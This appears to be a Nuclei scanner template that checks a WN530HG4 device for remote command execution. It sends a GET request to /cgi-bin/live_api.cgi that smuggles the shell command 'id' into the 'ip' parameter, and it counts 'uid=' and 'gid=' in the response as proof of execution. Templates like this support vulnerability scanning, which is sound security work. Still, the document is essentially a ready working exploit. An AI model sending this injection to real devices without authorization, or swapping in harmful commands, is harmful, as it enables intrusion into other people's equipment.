id: WN530HG4-live-api-RCE

info:
  name: WN530HG4-live-api-RCE
  author: iSee857
  severity: critical
  description: |
    WN530HG4-live-api-RCE

http:
  - raw:
      - |
        GET /cgi-bin/live_api.cgi?page=oa5&id=2&ip=;id; HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
        condition: and